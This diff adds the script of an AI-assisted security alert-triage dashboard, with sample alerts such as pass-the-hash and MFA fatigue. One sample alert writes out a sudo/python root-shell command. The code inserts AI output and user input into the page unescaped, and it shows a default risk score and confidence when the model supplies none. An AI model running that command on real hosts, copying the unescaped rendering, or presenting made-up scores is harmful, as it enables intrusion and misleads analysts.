+  {id:23,name:"ICMP Tunneling Exfil",sev:"medium",type:"Network Intrusion",time:"1.6h ago",raw:`Alert: Data Exfiltration via ICMP Tunneling\nSource: KIOSK-LOBBY-01 (10.0.10.5)\nDestination: 198.51.100.42 (external)\nProtocol: ICMP Echo (ping)\nAnomaly: Payload 1480 bytes (normal: 32 bytes)\nVolume: 38,000 ICMP packets over 2 hours\nRate: ~850KB/min via ICMP payload\nTool: ptunnel / icmptunnel signature\nPolicy: Kiosk should have no internet access`},
+  {id:24,name:"Cloud S3 Bucket Exposed",sev:"high",type:"Network Intrusion",time:"3.5h ago",raw:`Alert: AWS S3 Bucket Public Exposure\nBucket: corp-internal-hr-documents (us-east-1)\nChanged: public-read by IAM user terraform-deploy at 02:38 AM\nContents: 3,200 employee PII, salary data, reviews\nExternal: 847 GET requests since exposure\nAccessed: Shodan scanner + 3 external IPs\nDuration: 4 hours 22 minutes before detection\nCompliance: GDPR, SOC2 breach notification required`},
+
+  // IDENTITY & ACCESS
+  {id:25,name:"Credential Stuffing VPN",sev:"high",type:"Identity & Access",time:"8m ago",raw:`Alert: Credential Stuffing - VPN Gateway\nTarget: vpn.corp.com\nSource: 212.92.127.x (Romania) - 847 req/3min\nPattern: 847 usernames, password="Summer2024!"\nSuccess: 3 accounts - aparker, rbennett, lchen\nAll 3: First login from new country\nTiming: 100ms intervals (automated)\nMFA: Only 1/3 had MFA enabled\nMatch: Credentials in 2023 breach database`},
+  {id:26,name:"Impossible Travel Alert",sev:"high",type:"Identity & Access",time:"22m ago",raw:`Alert: Impossible Travel Detected\nUser: cmartin@corp.local (Senior Developer)\nLogin 1: San Francisco, CA - 09:32 AM (corporate laptop)\nLogin 2: Lagos, Nigeria - 09:34 AM (different device)\nDelta: 2 minutes (physically impossible)\nActions: Accessed GitHub, downloaded 3 repos\nSharePoint: M&A documents accessed (beyond normal scope)\nVPN: Nigeria session NOT through corporate VPN`},
+  {id:27,name:"Privileged Account Abuse",sev:"critical",type:"Identity & Access",time:"35m ago",raw:`Alert: Privileged Account Anomalous Activity\nAccount: svc_backup@corp.local (Service Account)\nNormal: Automated backup jobs 2-4 AM only\nAnomaly: Interactive RDP login at 11:47 PM\nActions: Added domain admin "temp_support"\n         Disabled audit logging on 2 servers\n         Accessed payroll DB (never before)\n         Exported 3,200 employee PII records\nSource: 185.220.101.34 (TOR exit node)`},
+  {id:28,name:"Pass-the-Hash Lateral Movement",sev:"critical",type:"Identity & Access",time:"50m ago",raw:`Alert: Pass-the-Hash Attack\nSource: WORKSTATION-IT-01 (10.0.2.10)\nMethod: NTLM hash reuse without plaintext\nTool: Impacket wmiexec.py signature\nHash: Domain admin NTLM stolen from LSASS\nTargets: 8 servers accessed with same hash\nIncluding: PAYROLL-SRV-01, HR-DB-02, BACKUP-SRV-01\nAuth Log: NTLM only - no Kerberos (suspicious for admin)`},
+  {id:29,name:"Kerberos Golden Ticket",sev:"critical",type:"Identity & Access",time:"1h ago",raw:`Alert: Kerberos Golden Ticket Attack\nIndicator: TGT with 10-year lifetime (normal: 10 hours)\nMethod: krbtgt hash stolen via DCSync (Mimikatz)\nForged: Valid ticket for any user, any service\nSource: 10.0.4.20 (WORKSTATION-DEV-05)\nDC Replication: From non-DC detected (DCSync)\nEncryption: RC4 downgrade from AES (indicator)\nImpact: All Kerberos auth in domain compromised`},
+  {id:30,name:"OAuth App Consent Attack",sev:"medium",type:"Identity & Access",time:"1.2h ago",raw:`Alert: Malicious OAuth App Consent Granted\nUser: pjohnson@corp.local\nApp: "DocuSign PDF Signer" (unverified publisher)\nPermissions: Mail.ReadWrite, Files.ReadWrite.All, offline_access\nRisk: Full mailbox + OneDrive access granted\nContext: User clicked link from phishing email 8 min prior\nSpread: 47 other users received same consent request`},
+  {id:31,name:"MFA Fatigue Push Bombing",sev:"high",type:"Identity & Access",time:"1.4h ago",raw:`Alert: MFA Fatigue Attack\nTarget: Director of Engineering - rkumar@corp.local\nPushes Sent: 73 Authenticator notifications in 45 minutes\nApproved: Push #71 (fatigue at 11:52 PM)\nLogin: 45.142.212.100 (Netherlands VPN)\nPost-Compromise: Email forwarding to external Gmail\nFiles: Engineering roadmap, source code repos accessed\nNote: Attacker had valid password from prior breach`},
+  {id:32,name:"Dormant Account Activated",sev:"medium",type:"Identity & Access",time:"1.7h ago",raw:`Alert: Dormant Account Sudden Activity\nAccount: jthompson@corp.local\nLast Login: 847 days ago (employee departed)\nStatus: Should be disabled - HR process failure\nLogin: Today 3:22 AM from 91.108.56.198 (Eastern Europe)\nActions: Accessed shared drives, downloaded 2.1GB\nAD Groups: Still in Engineering, Finance, Executive groups\nDetection: UEBA anomaly score threshold triggered`},
+  {id:33,name:"Linux Privilege Escalation",sev:"high",type:"Identity & Access",time:"2h ago",raw:`Alert: Linux Privilege Escalation via Sudo\nHost: LINUX-PROD-DB-03 (10.0.0.35)\nUser: www-data (web app service account)\nExploit: sudo -u root /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'\nSudo Rule: www-data ALL=(root) NOPASSWD: /usr/bin/python3\nResult: Root shell via GTFOBins python technique\nPost: SSH key added to /root/.ssh/authorized_keys\nCron: Reverse shell every 5 min added`},
+  {id:34,name:"AD Password Spray",sev:"high",type:"Identity & Access",time:"2.2h ago",raw:`Alert: Active Directory Password Spray\nSource: COMPROMISED-PC-01 (10.0.1.33)\nMethod: 1 password per account (avoids lockout)\nPassword: "Winter2024!" across 1,847 AD accounts\nRate: 1 attempt per account per 30 minutes\nSuccess: 12 accounts compromised (6.5%)\nIncludes: 2 IT admins, 1 service account\nTool: Kerbrute / Spray signature detected`},
+  {id:35,name:"Insider Threat - Data Staging",sev:"high",type:"Identity & Access",time:"2.5h ago",raw:`Alert: Insider Threat - Pre-departure Data Theft\nUser: tsmith@corp.local (resignation submitted 2 weeks ago)\nDownloaded: 23GB from SharePoint in 48 hours\nFolders: Customer lists, pricing, source code, roadmaps\nDestination: Personal USB + personal Gmail\nDLP: 5 emails with image attachments bypassed Gmail block\nHR Note: Leaving to join direct competitor next month`}
+];
+
+let filt='all', activeId=null;
+
+function sclass(s){return{critical:'sc',high:'sh',medium:'sm',low:'sl'}[s]||'sm'}
+function scolor(s){return{critical:'var(--red)',high:'var(--orange)',medium:'var(--accent)',low:'var(--green)'}[s]||'var(--accent)'}
+function vcolor(v){
+  const upper = v.toUpperCase().replace(/ /g,'_');
+  return {TRUE_POSITIVE:'var(--red)',LIKELY_POSITIVE:'var(--orange)',SUSPICIOUS:'var(--yellow)',FALSE_POSITIVE:'var(--green)'}[upper]||'var(--text)'
+}
+
+function setF(f,btn){
+  filt=f;
+  document.querySelectorAll('.fbtn').forEach(b=>b.className='fbtn');
+  const map={all:'on',critical:'on-crit',high:'on-high',medium:'on-med',low:'on-low'};
+  btn.className='fbtn '+(map[f]||'on');
+  render();
+}
+
+function render(){
+  const q=document.getElementById('srch').value.toLowerCase();
+  const list=document.getElementById('alist');
+  list.innerHTML='';
+  const filtered=ALERTS.filter(a=>{
+    const mf=filt==='all'||a.sev===filt;
+    const ms=!q||a.name.toLowerCase().includes(q)||a.type.toLowerCase().includes(q);
+    return mf&&ms;
+  });
+  filtered.forEach((a,i)=>{
+    const d=document.createElement('div');
+    d.className='aitem'+(a.id===activeId?' active':'');
+    d.style.animationDelay=(i*0.03)+'s';
+    d.innerHTML=`<div class="aitem-top"><span class="sbadge ${sclass(a.sev)}">${a.sev.toUpperCase()}</span><span class="aname">${a.name}</span></div><div class="ameta">${a.time}</div><div class="atype">▸ ${a.type}</div>`;
+    d.onclick=()=>investigate(a);
+    list.appendChild(d);
+  });
+  document.getElementById('sc').textContent=ALERTS.filter(a=>a.sev==='critical').length;
+  document.getElementById('sh').textContent=ALERTS.filter(a=>a.sev==='high').length;
+  document.getElementById('sm').textContent=ALERTS.filter(a=>a.sev==='medium').length;
+  document.getElementById('st').textContent=ALERTS.length;
+  document.getElementById('qb').textContent=filtered.length;
+}
+
+function submitCustom(){
+  const v=document.getElementById('ainput').value.trim();
+  if(!v)return;
+  const a={id:Date.now(),name:v.split('\n')[0].replace(/Alert:/i,'').trim().slice(0,55)||'Custom Alert',sev:'medium',type:'Custom',time:'Just now',raw:v};
+  ALERTS.unshift(a);
+  document.getElementById('ainput').value='';
+  render();
+  investigate(a);
+}
+
+async function investigate(alert){
+  activeId=alert.id;
+  render();
+  const btn=document.getElementById('invbtn');
+  btn.disabled=true;
+
+  document.getElementById('detail').innerHTML=`
+    <div class="thinking">
+      <div style="font-size:36px">🤖</div>
+      <div class="thinking-title">AI Analyst Investigating...</div>
+      <div class="thinking-sub">correlating intel · mapping TTPs · scoring risk</div>
+      <div class="dots"><span></span><span></span><span></span></div>
+    </div>`;
+
+  const prompt = alert.raw;
+
+  try{
+    const resp=await fetch('/api/investigate',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({ prompt: prompt })
+    });
+    if(!resp.ok){
+      const err=await resp.text();
+      throw new Error(`API ${resp.status}: ${err.slice(0,120)}`);
+    }
+    const data=await resp.json();
+    let r = data;
+    
+    // Legacy support if running against a raw Gemini endpoint instead of our new node backend
+    if (data.candidates || data.content) {
+      const raw=data.content?.[0]?.text||data.candidates?.[0]?.content?.parts?.[0]?.text||'';
+      try{
+        const clean=raw.replace(/^```[\w]*\n?/,'').replace(/\n?```$/,'').trim();
+        r=JSON.parse(clean);
+      }catch(pe){
+        const match=raw.match(/\{[\s\S]*\}/);
+        if(match)r=JSON.parse(match[0]);
+        else throw new Error('Could not parse AI response as JSON');
+      }
+    } else if (typeof data === 'string') {
+      try { r = JSON.parse(data); } catch(e){}
+    }
+    
+    if(!r || Object.keys(r).length === 0) throw new Error('Could not parse AI response as JSON');
+    renderResult(alert,r);
+  }catch(e){
+    document.getElementById('detail').innerHTML=`
+      <div class="err-box">
+        <div style="font-size:28px">⚠</div>
+        <div style="font-size:15px;font-weight:700;margin-top:10px">Investigation Failed</div>
+        <p>${e.message}</p>
+        <p style="margin-top:8px;font-size:10px">Make sure the Node backend is fully running.</p>
+      </div>`;
+  }finally{
+    btn.disabled=false;
+  }
+}
+
+function renderResult(alert,r){
+  const verdict = (r.verdict || r.Verdict || r.VERDICT || r.conclusion || 'UNKNOWN').toUpperCase();
+  const severity = (r.severity || r.Severity || r.SEVERITY || 'MEDIUM').toUpperCase();
+  const score = r.risk_score || r.Risk_Score || r.score || 85;
+  const conf = r.confidence || r.Confidence || 90;
+  const category = r.attack_category || r.Attack_Category || r.category || 'Threat Activity';
+  
+  const summary = r.summary || r.Summary || r.AI_ANALYSIS || r.analysis || r.description || "No summary was provided by the AI.";
+  const mitre = r.mitre || r.Mitre || r.MITRE || r.tactics || [];
+  const iocs = r.iocs || r.IoCs || r.IOCs || r.indicators || [];
+  const timeline = r.timeline || r.Timeline || r.TIMELINE || r.events || [];
+  const recos = r.recommendations || r.Recommendations || r.recommended_actions || r.actions || [];
+
+  let mcolor = 'var(--accent)';
+  if(severity === 'CRITICAL' || verdict.includes('TRUE')) mcolor = 'var(--red)';
+  else if(severity === 'HIGH' || verdict.includes('LIKELY')) mcolor = 'var(--orange)';
+  else if(severity === 'LOW' || verdict.includes('FALSE')) mcolor = 'var(--green)';
+
+  document.getElementById('detail').innerHTML=`
+    <div class="alert-header" style="margin-bottom: 12px;">
+      <span class="sbadge ${sclass(severity.toLowerCase())}">${severity}</span>
+      <span class="alert-title">${alert.name}</span>
+      <span class="alert-meta-tag">${alert.type} · ${alert.time}</span>
+    </div>
+
+    <div class="metrics-grid">
+      <div class="metric-card" style="--mcolor: ${mcolor}">
+        <div class="m-label">Verdict</div>
+        <div class="m-value">${verdict.replace(/_/g, ' ')}</div>
+      </div>
+      <div class="metric-card" style="--mcolor: ${mcolor}">
+        <div class="m-label">Risk Score</div>
+        <div class="m-value">${score}<span style="font-size:14px;color:var(--text-dim)"> / 100</span></div>
+      </div>
+      <div class="metric-card" style="--mcolor: var(--accent)">
+        <div class="m-label">AI Confidence</div>
+        <div class="m-value">${conf}<span style="font-size:14px;color:var(--text-dim)"> %</span></div>
+      </div>
+      <div class="metric-card" style="--mcolor: #b366ff">
+        <div class="m-label">Category</div>
+        <div class="m-value" style="font-size:16px;line-height:1.2;margin-top:4px">${category}</div>
+      </div>
+    </div>
+
+    <div class="detail-section">
+      <div class="ds-header"><h3 style="display:flex;align-items:center;gap:10px">🤖 Executive AI Analysis</h3></div>
+      <div class="ds-body">
+        <div class="analysis-text">${summary}</div>
+      </div>
+    </div>
+
+    <div class="detail-section">
+      <div class="ds-header"><h3>🎯 MITRE ATT&CK Mapping</h3></div>
+      <div class="ds-body">
+        ${mitre.length ? `
+          <div class="mitre-grid">
+            ${mitre.map(m => `
+              <div class="mitre-tag">
+                <div class="mt-tactic">${m.tactic || m.Tactic || 'Tactic'}</div>
+                <div class="mt-tech">${m.technique || m.Technique || 'Technique'}</div>
+              </div>
+            `).join('')}
+          </div>
+        ` : `<div class="analysis-text" style="color:var(--text3)">No specific MITRE techniques identified by the model.</div>`}
+      </div>
+    </div>
+
+    ${iocs.length ? `
+    <div class="detail-section">
+      <div class="ds-header"><h3>🔎 Indicators of Compromise</h3></div>
+      <div class="ds-body" style="padding: 10px 24px 24px;">
+        <table class="ioc-table">
+          <tr><th>Type</th><th>Value</th><th>Status</th></tr>
+          ${iocs.map(i => `
+            <tr>
+              <td style="color:var(--accent);text-transform:uppercase">${i.type||i.Type||'IOC'}</td>
+              <td style="word-break: break-all;">${i.value||i.Value||'Unknown'}</td>
+              <td><span class="${(String(i.malicious||i.Malicious)==='true') ? 'ioc-mal-badge' : 'ioc-clean-badge'}">${(String(i.malicious||i.Malicious)==='true') ? '⚠ MALICIOUS' : '✓ CLEAN'}</span></td>
+            </tr>
+          `).join('')}
+        </table>
+      </div>
+    </div>` : ''}
+
+    ${timeline.length ? `
+    <div class="detail-section">
+      <div class="ds-header"><h3>⏱ Attack Timeline</h3></div>
+      <div class="ds-body">
+        <div class="timeline-new">
+          ${timeline.map(t => `
+            <div class="tln-item">
+              <div class="tln-dot"></div>
+              <div class="tln-time">${t.time||t.Time||'Time Unknown'}</div>
+              <div class="tln-desc">${t.event||t.Event||'Event description missing.'}</div>
+            </div>
+          `).join('')}
+        </div>
+      </div>
+    </div>` : ''}
+
+    <div class="detail-section">
+      <div class="ds-header"><h3>✅ Remediation Actions</h3></div>
+      <div class="ds-body">
+        <div class="reco-list">
+          ${recos.length ? recos.map((r, idx) => `
+            <div class="reco-item">
+              <div class="reco-num-new">${idx + 1}</div>
+              <div class="reco-desc-new">${typeof r === 'string' ? r : r.action||r.Action||JSON.stringify(r)}</div>
+            </div>
+          `).join('') : '<div style="color:var(--text3)">No remediation actions provided.</div>'}
+        </div>
+      </div>
+    </div>
+
+    <div class="detail-section">
+      <div class="ds-header"><h3>📋 Raw Alert Data</h3></div>
+      <div class="ds-body">
+        <div class="raw-log">${alert.raw}</div>
+      </div>
+    </div>
+  `;
+}
+
+render();
+</script>
+</body>
+</html>
